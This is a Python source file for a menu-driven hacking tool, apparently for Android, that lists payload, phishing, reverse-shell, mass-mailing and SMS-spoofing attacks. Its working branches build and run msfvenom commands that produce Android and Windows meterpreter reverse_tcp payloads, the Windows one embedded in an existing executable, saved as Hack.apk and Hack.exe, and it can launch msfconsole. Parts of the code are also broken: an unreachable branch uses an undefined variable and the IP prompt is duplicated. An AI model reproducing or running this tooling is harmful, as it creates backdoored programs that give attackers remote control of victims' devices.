import os;
import subprocess;

"""
class fg: 

        black='\033[30m'

        red='\033[31m'

        green='\033[32m'

        orange='\033[33m'

        blue='\033[34m'

        purple='\033[35m'

        cyan='\033[36m'

        lightgrey='\033[37m'

        darkgrey='\033[90m'

        lightred='\033[91m'

        lightgreen='\033[92m'

        yellow='\033[93m'

        lightblue='\033[94m'

        pink='\033[95m'
        lightcyan='\033[96m'
        
         
      """
"""
  *
 ***
*****
*****
Function to Rightinput
*****
*****
 ***
  *
"""
def Rightinput(datatype,newline,color):
	if datatype=="int()":
		while True:
			try:
				intinput=int(input());
				return intinput;
				break;	
			except:
				print("\033[31m : .error input integer value \033[93m*");
				continue;
	elif(datatype=="int()" and breakline=="\n" ):
		while True:
			try:
				intinput=int(input(breakline));
				return intinput;
				break;	
			except:
				print("\033[31m : .error input integer value \033[93m*");
				continue;
           
"""
  *
 ***
*****
*****
Function to forlder  in directory and return ~~||True ~~||False||~~
*****
*****
 ***
  *
"""
def Checkof(Directory,FName):
	listdirectory=os.listdir(Directory);
	if(FName in listdirectory):
		return True;
	else:
		return False;


"""
  *
 ***
*****
*****
Function to creat a forder in actual directory ok
*****
*****
 ***
  *
"""
def Makefolder(Directory,FName):
	if(Checkof(Directory,FName)==False):
		os.mkdir(Directory+str("/"+FName));


"""
  *
 ***
*****
*****
Function to return ip port;
*****
*****
 ***
  *
"""
def ipport():
	Ip=input("\n\nIp: ");
	while True:
		try:
			Port=int(input("\033[32mPort: "));
			return Ip,Port;
			break;
		except:
			print("\033[31m : .error input integer value \033[93m*");		
 
"""
  *
 ***
*****
*****
Function to git clone with url and folder
*****
*****
 ***
  *
"""
def gitownload(Url,Location):
	print("\n\033[95m[^_^]Your present directory is *  {}".format(os.getcwd()));
	yorn=input("\033[33m\n\n[*]Do you want to download (y/n 'for other folder') in sdcard/Arquam/~# ");
	if(yorn=='y' or yorn=='Y' or yorn=='y ' or yorn=='Y '):
		os.chdir("/sdcard/Arquam");
		print("\033[34mDownloading...");
		os.system("git clone "+str(Url));


"""
  *
 ***
*****
*****
Function to Home option here
*****
*****
 ***
  *
"""

def Homeoption():
	print("\033[33             __ ");
	print('\033[33m       .-        -.');
	print("\033[31m      /            \ ");
	print();
	print("\033[32m     |,  .-.  .-.  ,|  ");
	print("\033[31m     | )(_ /  \_ )( |  ");
	print("     |/     /\     \|       ");
	print('\033[32m     <__    ^^    __>');
	print("\033[32m      \__|IIIIII|__/");
	print();
	print("\033[31m        \ IIIIII / ");
	print("\033[31m         -------- " );
	print("\033[31m            _ ");
	input("\n\n\n\033[33mcontinue...");
	print("\033[33m::::::::::::"*5);
	print("\033[33m::::::::::::"*5);
	print("\033[32m:::[1]\033[31m Payload (android)");
	print("\033[32m:::[2]\033[31m Payload (iphone)")
	print("\033[32m:::[3]\033[31m Payload (windows)")
	print("\033[32m:::[4]\033[31m Phishing page(facebook)")
	print("\033[32m:::[5]\033[31m Python reverse shell\033[93m*  ")
	print("\033[32m:::[6]\033[31m Mass Mailer Attack")
	print("\033[32m:::[7]\033[31m Powershell Attack Vectors")
	print("\033[32m:::[8]\033[31m SMS Spoofing Attack Vector")
	print("\033[32m:::[9]\033[31m Custom Exploits")
	print("\033[32m:::[10]\033[31m SCCM Attack Vector")
	print("\033[32m:::[11]\033[31m PSEXEC Powershell Injection")
	print("\033[32m:::[12]\033[31m Help, Credits, and About")
	print("\033[32m:::[13]\033[31m Update SET configuration")
	print("\033[32m:::[14]\033[31m msfconsole\033[93m*")
	print("\033[32m:::[15]\033[31m Exit")
	print("\033[33m::::::::::::"*5);
	print("\033[33m::::::::::::"*5);
	inputoption=Rightinput("int()","None","Red");	
	"""
	android payload
    option1	
	"""
	if(inputoption==1):
		print("\t\t*************************")
		print("\t\t     Android Payload")
		print("\t\t*************************")
		Ip=input("\n\nIp: ");
		Ip,Port=ipport();
		command="msfvenom -p android/meterpreter/reverse_tcp LHOST="+str(Ip)+" LPORT="+str(Port)+" R> /sdcard/Arquam/Hack.apk";
		print("generating payload...");
		os.system("sleep 3")
		print(command);
		os.system(command);
		"""
		windows payload 
		option 3
		"""
	elif(inputoption==3):
		print("\033[32m\n\t\t*************************")
		print("\t\t     Windows  Payload")
		print("\t\t*************************")
		print("\n\033[31m░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░     ");
		print("░░░░█░░░░░░░░░░░░░█░░░░") ;
		print("░░░█░░░░░░░░░░▄▄▄░░█░░░  ");
		print("░░░█░░▄▄▄░░▄░░███░░█░░░  ");
		print("░░░▄█░▄░░░▀▀▀░░░▄░█▄░░░  ");
		print("░░░█░░▀█▀█▀█▀█▀█▀░░█░░░ ");
		print("░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░  ");
		print("░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░  ");
		Ip,Port=ipport();
		command="msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST="+str(Ip)+" LPORT="+str(Port)+" -f exe > /sdcard/Arquam/Hack.exe";
		print("generating payload...");
		os.system("sleep 3");
		print(command)
		os.system(command);
		
		
	elif(inputoption==4):
		print("\033[32m\n\t\t*************************")
		print("\t\t     FB phishing page")
		print("\t\t*************************")	
		gitownload("https://github.com/ArquamGenius/hackingscriptpython/blob/master/makeshellapk.py",28);
			

		




	
	if(inputoption==14):
		os.system("msfconsole");



"""
___________________________
#########FUNCTIONS#########
--------------------------
---------------------------
1.)Checkof(path,folder name)
2.)Makefolder(path,folder name)
3.)Homeoption() with dangerous logo
4.)Rightinput(datatype)
"""
if __name__=="__main__":
	def main():		
		Makefolder("/sdcard","Arquam");						
		#option input
		Homeoption();
		
	main()
		